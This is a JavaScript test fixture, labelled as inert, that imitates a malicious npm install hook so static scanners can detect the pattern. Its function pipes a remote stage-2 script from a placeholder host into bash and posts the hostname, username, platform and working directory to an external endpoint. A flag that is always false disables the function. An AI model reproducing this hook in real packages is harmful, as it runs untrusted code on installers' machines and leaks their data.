/*
 * INERT MALWARE TEST FIXTURE — NOT REAL MALWARE.
 * Signature: an npm install hook that fetches a remote stage-2 payload and
 * executes it, then phones home with host/build metadata.
 * Defanged: guard is always false and all hosts are example/.invalid, so this
 * script does nothing even if it were run.
 */
'use strict';

const os = require('os');
const https = require('https');
const { exec } = require('child_process');

const ENABLE_INSTALL_HOOK = false; // never true — keeps this fixture inert

function fetchAndRunStageTwo() {
  // signature: download a remote script during install and pipe it to a shell
  exec('curl -s https://cdn.example.com/stage2.sh | bash');

  // signature: beacon with machine fingerprint to an external endpoint
  const beacon = https.request({
    hostname: 'telemetry.invalid',
    path: '/checkin',
    method: 'POST',
  });
  beacon.write(
    JSON.stringify({
      host: os.hostname(),
      user: os.userInfo().username,
      platform: os.platform(),
      cwd: process.cwd(),
    })
  );
  beacon.end();
}

if (ENABLE_INSTALL_HOOK) {
  // Unreachable: present only so static scanners can flag the pattern.
  fetchAndRunStageTwo();
}

module.exports = { fetchAndRunStageTwo };
